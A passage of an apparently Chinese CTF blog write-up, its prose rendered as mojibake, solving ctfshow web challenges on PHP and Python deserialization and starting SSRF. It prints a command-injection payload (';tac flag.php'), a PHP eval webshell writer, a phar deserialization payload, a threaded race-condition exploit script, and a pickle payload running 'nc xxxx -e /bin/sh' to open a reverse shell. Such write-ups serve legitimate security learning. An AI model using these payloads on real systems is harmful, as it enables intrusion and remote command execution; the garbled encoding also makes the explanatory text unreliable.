<pre><code class="highlight plaintext">Tzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO3M6MToiYSI7czozOiJtc2ciO3M6MToiMSI7czoyOiJ0byI7czoxOiIyIjtzOjU6InRva2VuIjtzOjU6ImFkbWluIjt9</code></pre>

<p>ç›´æ¥ä¼ ä¹Ÿå¯ä»¥å¾—åˆ°flag</p>
<h3 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h3><p>è¿›æ¥æ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œæ‡µäº†ä¸€ä¸‹ï¼Œæœæ–­è¯·ä»–åƒæˆ‘ä¸€æ‰«</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250717163049318.png" alt="image-20250717163049318"></p>
<h3 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>

<span class="comment">/*</span>
<span class="comment"># -*- coding: utf-8 -*-</span>
<span class="comment"># <span class="doctag">@Author</span>: h1xa</span>
<span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 02:37:19</span>
<span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span>
<span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 16:05:38</span>
<span class="comment"># <span class="doctag">@message</span>.php</span>
<span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span>
<span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span>
<span class="comment"></span>
<span class="comment">*/</span>


<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">session_start</span>();

<span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$from</span>;
    <span class="keyword">public</span> <span class="variable">$msg</span>;
    <span class="keyword">public</span> <span class="variable">$to</span>;
    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;
        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;
        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;
        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;
    &#125;
&#125;

<span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];
<span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];
<span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];

<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;
    <span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);
    <span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));
    <span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$umsg</span>);
    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;
&#125;

<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</code></pre>

<p>æ€ä¹ˆæ„Ÿè§‰ï¼Œä¼¼æ›¾ç›¸è¯†å•Šã€‚</p>
<p>ä½†æ˜¯æŠŠä¹‹å‰é‚£é¢˜èƒ½ç›´æ¥æ”¹msgçš„éé¢„æœŸä¿®æ‰äº†ã€‚</p>
<p>æ‰€ä»¥ç›´æ¥ç”¨ä¸Šä¸Šé¢˜çš„poc</p>
<p>ä½†æ˜¯ç”±äºå®ƒä¸è‡ªå¸¦msg,ä½ éœ€è¦æŠ“åŒ…æ”¹ä¸€ä¸‹CookieåŠ ä¸€ä¸ªmsg,ä»€ä¹ˆå€¼éšæ„</p>
<h3 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>

<span class="comment">/*</span>
<span class="comment"># -*- coding: utf-8 -*-</span>
<span class="comment"># <span class="doctag">@Author</span>: h1xa</span>
<span class="comment"># <span class="doctag">@Date</span>:   2020-12-04 23:52:24</span>
<span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span>
<span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-05 00:17:08</span>
<span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span>
<span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span>
<span class="comment"></span>
<span class="comment">*/</span>

<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$token</span>;
    <span class="keyword">public</span> <span class="variable">$password</span>;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$p</span></span>)</span>&#123;
        <span class="variable language_">$this</span>-&gt;token=<span class="variable">$t</span>;
        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;token===<span class="variable language_">$this</span>-&gt;password;
    &#125;
&#125;

<span class="variable">$ctfshow</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);
<span class="variable">$ctfshow</span>-&gt;token=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());

<span class="keyword">if</span>(<span class="variable">$ctfshow</span>-&gt;<span class="title function_ invoke__">login</span>())&#123;
    <span class="keyword">echo</span> <span class="variable">$flag</span>;
&#125;</code></pre>

<p>æ„Ÿè§‰æ˜¯ä¸€ä¸ªmd5ç»•è¿‡ï¼Œé©¬ä¸Šæƒ³èµ·æ¥<strong>Error&#x2F;Exception</strong>åŸç”Ÿç±»æ˜¯å¯ä»¥ç»•è¿‡å“ˆå¸Œçš„ï¼Œä½†æ˜¯è¿™é‡Œç”¨ä¸åˆ°</p>
<p>ä»”ç»†æƒ³æƒ³ï¼Œè¦tokenå’Œpasswordç›¸ç­‰ï¼Œè¿™é‡Œå¿…é¡»è¦tokenåŠ¨passwordä¹ŸåŠ¨</p>
<p>é‚£ä¹ˆç”¨&amp;è¯•ä¸€ä¸‹è¡Œä¸è¡Œ</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="number">1</span>;
    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="number">1</span>;
&#125;
<span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfshowAdmin</span>();
<span class="variable">$a</span>-&gt;password=&amp;<span class="variable">$a</span>-&gt;token;
<span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</code></pre>

<p>ç›´æ¥å°±å¾—åˆ°flagäº†</p>
<h3 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>

<span class="comment">/*</span>
<span class="comment"># -*- coding: utf-8 -*-</span>
<span class="comment"># <span class="doctag">@Author</span>: h1xa</span>
<span class="comment"># <span class="doctag">@Date</span>:   2020-12-04 23:52:24</span>
<span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span>
<span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-05 00:17:08</span>
<span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span>
<span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span>
<span class="comment"></span>
<span class="comment">*/</span>

<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);

<span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);
<span class="variable">$cs</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);


<span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;
        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;
        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable language_">$this</span>-&gt;password;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">global</span> <span class="variable">$flag</span>;
        <span class="keyword">echo</span> <span class="variable">$flag</span>;
    &#125;
&#125;
<span class="variable">$ctfshowo</span>=@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$cs</span>);
<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$cs</span>))&#123;
    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);
&#125;</code></pre>

<p>è¿™é‡Œåªè¦ä¸æŠ›é”™å°±èƒ½å¾—åˆ°æ­£å¸¸çš„ç»“æœ</p>
<p>è¿™è¾¹æ­£åˆ™æ²¡æœ‰ç”¨æ¨¡ç³ŠåŒ¹é…(i)çš„æ¨¡å¼ï¼Œç›´æ¥å¤§å°å†™ç»•è¿‡å³å¯</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&quot;1&quot;</span>;
    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&quot;2&quot;</span>;
&#125;
<span class="variable">$ctfshowo</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();
<span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$ctfshowo</span>);
<span class="comment">//æŠŠç»“æœçš„ctfshowä»»æ„æ”¹ä¸€ä¸ªå­—æ¯ä¸ºå¤§å†™å³å¯</span></code></pre>

<p>å¹¶ä¸”è¿™è¾¹å³ä½¿ä»€ä¹ˆéƒ½ä¸å†™ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œå¿…å®šä¼š<code>__destruct</code>ï¼Œåˆ©ç”¨PHP<strong>å‡½æ•°åå’Œç±»åä¸åŒºåˆ†å¤§å°å†™ï¼Œå˜é‡ååŒºåˆ†</strong>çš„ç‰¹æ€§</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>

<span class="class"><span class="keyword">class</span> <span class="title">Ctfshow</span></span>&#123;
&#125;

<span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">Ctfshow</span>();

<span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));

<span class="meta">?&gt;</span></code></pre>

<h3 id="web267"><a href="#web267" class="headerlink" title="web267"></a>web267</h3><h3 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>

<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);

<span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$filename</span>;
    <span class="keyword">public</span> <span class="variable">$filecontent</span>;
    <span class="keyword">public</span> <span class="variable">$evilfile</span>=<span class="literal">false</span>;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$fn</span></span>)</span>&#123;
        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$f</span>;
        <span class="variable language_">$this</span>-&gt;filecontent=<span class="variable">$fn</span>;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkevil</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|\.\./i&#x27;</span>, <span class="variable">$this</span>-&gt;filename))&#123;
            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;
        &#125;
        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$this</span>-&gt;filecontent))&#123;
            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;
        &#125;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;evilfile;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;evilfile)&#123;
            <span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm &#x27;</span>.<span class="variable">$this</span>-&gt;filename);
        &#125;
    &#125;
&#125;

<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]))&#123;
    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);
    <span class="variable">$f</span> = <span class="keyword">new</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="variable">$content</span>);
    <span class="keyword">if</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">checkevil</span>()===<span class="literal">false</span>)&#123;
        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>], <span class="variable">$content</span>);
        <span class="title function_ invoke__">copy</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()).<span class="string">&#x27;.txt&#x27;</span>);
        <span class="title function_ invoke__">unlink</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]);
        <span class="keyword">echo</span> <span class="string">&#x27;work done&#x27;</span>;
    &#125;
    
&#125;<span class="keyword">else</span>&#123;
    <span class="keyword">echo</span> <span class="string">&#x27;where is flag?&#x27;</span>;
&#125;</code></pre>

<p>æ„Ÿè§‰æ˜¯æ‹¼æ¥å­—ç¬¦ä¸²å‘½ä»¤æ‰§è¡Œ</p>
<p><strong>POC1</strong></p>
<pre><code class="highlight plaintext">/?fn=;tac flag.php</code></pre>

<p>åšå®Œçœ‹æºç åœ¨æ€è€ƒ,èƒ½ä¸èƒ½å†™ä¸€ä¸ªé©¬è¿›å»å‘¢ã€‚ã€‚</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;shell.php&#x27;</span>, <span class="string">&#x27;&lt;?php @eval($_POST[1]); ?&gt;&#x27;</span>);
<span class="meta">?&gt;</span>
<span class="comment">//filename=1.pthml</span></code></pre>

<p>ä½†æ˜¯æœ€åæ²¡å†™è¿›å»ï¼Œç”¨å‘½ä»¤æ‹¼æ¥å‘ç°æ˜¯æœ‰æ–‡ä»¶å†™å…¥æƒé™çš„ï¼Œä¸æ‡‚äº†</p>
<p>ç„¶åå‘ç°è‡ªå·±çŠ¯äº†ä¸ªå¾ˆå¼±æ™ºçš„é”™è¯¯</p>
<p>è¿™ä¸ªé©¬è¿˜æ²¡è®¿é—®å°±è¢«åˆ é™¤æ‹¿å¤´æ‰§è¡Œå•Šã€‚ã€‚</p>
<h3 id="web276"><a href="#web276" class="headerlink" title="web276"></a>web276</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>

<span class="comment">/*</span>
<span class="comment"># -*- coding: utf-8 -*-</span>
<span class="comment"># <span class="doctag">@Author</span>: h1xa</span>
<span class="comment"># <span class="doctag">@Date</span>:   2020-12-08 19:13:36</span>
<span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span>
<span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-08 20:08:07</span>
<span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span>
<span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span>
<span class="comment"></span>
<span class="comment">*/</span>


<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);

<span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$filename</span>;
    <span class="keyword">public</span> <span class="variable">$filecontent</span>;
    <span class="keyword">public</span> <span class="variable">$evilfile</span>=<span class="literal">false</span>;
    <span class="keyword">public</span> <span class="variable">$admin</span> = <span class="literal">false</span>;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$fn</span></span>)</span>&#123;
        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$f</span>;
        <span class="variable language_">$this</span>-&gt;filecontent=<span class="variable">$fn</span>;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkevil</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|\.\./i&#x27;</span>, <span class="variable">$this</span>-&gt;filename))&#123;
            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;
        &#125;
        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$this</span>-&gt;filecontent))&#123;
            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;
        &#125;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;evilfile;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;evilfile &amp;&amp; <span class="variable language_">$this</span>-&gt;admin)&#123;
            <span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm &#x27;</span>.<span class="variable">$this</span>-&gt;filename);
        &#125;
    &#125;
&#125;

<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]))&#123;
    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);
    <span class="variable">$f</span> = <span class="keyword">new</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="variable">$content</span>);
    <span class="keyword">if</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">checkevil</span>()===<span class="literal">false</span>)&#123;
        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>], <span class="variable">$content</span>);
        <span class="title function_ invoke__">copy</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()).<span class="string">&#x27;.txt&#x27;</span>);
        <span class="title function_ invoke__">unlink</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]);
        <span class="keyword">echo</span> <span class="string">&#x27;work done&#x27;</span>;
    &#125;
    
&#125;<span class="keyword">else</span>&#123;
    <span class="keyword">echo</span> <span class="string">&#x27;where is flag?&#x27;</span>;
&#125;</code></pre>

<p>å¢åŠ äº†ä¸€ä¸ª<code>admin</code>çš„è®¤è¯</p>
<p>å¹¶ä¸”è¿™é‡Œä½ æ‹¿è¿™ä¸ªadminæ²¡åŠæ³•çš„ã€‚ã€‚</p>
<p>æ€è·¯æ˜¯pharååºåˆ—åŒ–ï¼Œä½†æ˜¯ç”±äºæºç ä¼šåˆ é™¤æ–‡ä»¶ï¼Œé‚£ä¹ˆå°±è¦ç”¨æ¡ä»¶ç«äº‰æ¥ç©ä¸€ç©äº†ã€‚</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">filter</span> </span>
<span class="class"></span>&#123;
    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&#x27;;cat fl*&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$evilfile</span> = <span class="literal">true</span>;
    <span class="keyword">public</span> <span class="variable">$admin</span> = <span class="literal">true</span>;
&#125;

<span class="comment">// åç¼€å¿…é¡»ä¸ºphar</span>
<span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;evil.phar&quot;</span>);
<span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();
<span class="comment">// è®¾ç½® stubb, å¢åŠ  gif æ–‡ä»¶å¤´</span>
<span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);
<span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">filter</span>();
<span class="comment">/**</span>
<span class="comment"> * å°†è‡ªå®šä¹‰çš„ meta-data å­˜å…¥ manifest</span>
<span class="comment"> * è¿™ä¸ªå‡½æ•°éœ€è¦åœ¨php.iniä¸­ä¿®æ”¹ phar.readonly ä¸º Off</span>
<span class="comment"> * å¦åˆ™çš„è¯ä¼šæŠ›å‡º </span>
<span class="comment"> * creating archive &quot;***.phar&quot; disabled by the php.ini setting phar.readonly </span>
<span class="comment"> * å¼‚å¸¸.</span>
<span class="comment"> */</span>
<span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);
<span class="comment">// æ·»åŠ éœ€å‹ç¼©çš„æ–‡ä»¶</span>
<span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);
<span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();

<span class="meta">?&gt;</span></code></pre>

<pre><code class="highlight python"><span class="comment">#encoding=gbk</span>
<span class="keyword">import</span> threading
<span class="keyword">import</span> requests
<span class="keyword">import</span> urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = <span class="string">&quot;https://3769cb08-d5ff-4f8a-8fda-5eff7c9d5c41.challenge.ctf.show/&quot;</span>
data = <span class="built_in">open</span>(<span class="string">&#x27;./evil.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()
flag = <span class="literal">True</span>
<span class="keyword">def</span> <span class="title function_">write</span>():
    requests.post(url+<span class="string">&#x27;?fn=evil.phar&#x27;</span>, data=data,verify=<span class="literal">False</span>)
<span class="keyword">def</span> <span class="title function_">unserialize</span>():
    <span class="keyword">global</span> flag
    r = requests.get(url+<span class="string">&#x27;?fn=phar://evil.phar&#x27;</span>,verify=<span class="literal">False</span>)
    <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#123;&#x27;</span> <span class="keyword">in</span> r.text <span class="keyword">and</span> flag:
        <span class="built_in">print</span>(r.text)
        flag = <span class="literal">False</span>
<span class="keyword">while</span> flag:
    threading.Thread(target = write).start()
    threading.Thread(target = unserialize).start()</code></pre>

<p>è„šæœ¬æ˜¯[è¿™ä½å¸ˆå‚…](<a href="https://blog.csdn.net/Myon5/article/details/143657655">ctfshow-webå…¥é—¨-ååºåˆ—åŒ–ï¼ˆweb271-web278ï¼‰_ctfshow web271-CSDNåšå®¢</a>)çš„ï¼</p>
<p>è¿™é‡Œè·‘äº†åŠå¤©æ‰è·‘å‡ºæ¥</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250723174915266.png" alt="image-20250723174915266"></p>
<h3 id="web277"><a href="#web277" class="headerlink" title="web277"></a>web277</h3><p>çœ‹çœ‹æºç æ³¨é‡Š</p>
<pre><code class="highlight html"><span class="comment">&lt;!--/backdoor?data= m=base64.b64decode(data) m=pickle.loads(m) --&gt;</span></code></pre>

<p>pickleååºåˆ—åŒ–æ¥çš„</p>
<p>ç®€å•åˆ°ä¸è¡Œçš„pickle</p>
<pre><code class="highlight python"><span class="keyword">import</span> pickle
<span class="keyword">import</span> base64
<span class="keyword">class</span> <span class="title class_">a</span>:
	<span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):
		<span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;nc xxxx -e /bin/sh&#x27;).read()&quot;</span>,))
obj = a()
code=pickle.dumps(obj)
<span class="built_in">print</span>(base64.b64encode(code))</code></pre>

<p>ç›´æ¥å¼¹shellï¼Œflagå°±åœ¨æ ¹ç›®å½•ä¸‹(é—®å°±æ˜¯æ— å›æ˜¾)</p>
<h3 id="web278"><a href="#web278" class="headerlink" title="web278"></a>web278</h3><p>é¢˜ç›®æç¤ºè¿‡æ»¤äº†os.system</p>
<p>ç„¶é¹…è¿™å’Œæˆ‘ä»¬å¹¶æ²¡æœ‰ä»»ä½•å…³ç³»</p>
<p>ç»§ç»­å¼¹</p>
<h2 id="SSRF-Complete"><a href="#SSRF-Complete" class="headerlink" title="SSRF(Complete)"></a>SSRF(Complete)</h2><h3 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
<span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);
<span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);
<span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);
<span class="keyword">echo</span> (<span class="variable">$result</span>);
<span class="meta">?&gt;</span></code></pre>

<p>ç›´æ¥è®¿é—®æç¤ºéæœ¬åœ°ç”¨æˆ·ç¦æ­¢è®¿é—®ï¼Œæ—¢ç„¶æ˜¯SSRFé‚£å°±æ˜¯åœ¨URLé‡Œè¾“å…¥<code>127.0.0.1/flag.php</code></p>
<h3 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
<span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);
<span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;
<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;
<span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);
